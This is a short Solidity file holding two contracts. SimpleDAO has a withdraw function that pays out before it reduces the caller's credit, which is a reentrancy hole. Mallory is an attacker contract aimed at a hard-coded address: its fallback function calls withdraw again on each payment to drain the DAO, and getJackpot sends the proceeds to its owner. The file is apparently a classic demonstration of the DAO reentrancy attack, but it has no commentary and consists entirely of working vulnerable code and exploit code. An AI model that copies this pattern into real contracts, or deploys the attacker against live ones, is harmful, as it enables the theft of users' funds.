contract SimpleDAO {
    mapping (address => uint) public credit;
    function donate(address to) payable public {credit[to] += msg.value;}
    function queryCredit(address to) view public returns (uint){
        return credit[to];
    }
    function getBalance() view public returns (uint){
        return this.balance;
    }
    function withdraw(uint amount) public{
        if (credit[msg.sender]>= amount) {
         msg.sender.call.value(amount)();
        credit[msg.sender]-=amount;
        }
    }
}

contract Mallory {
    SimpleDAO public dao = SimpleDAO(0xa5a2075994ca25397b8dab82e4834c1b09051d57);
    address owner;
    function Mallory()public{owner = msg.sender; }
    function() payable external { dao.withdraw(dao.queryCredit(this)); }
    function getJackpot()public{ owner.send(this.balance); }
    function pay() payable{
        
    }
    function getBalance() view public returns (uint){
        return this.balance;
    }
}

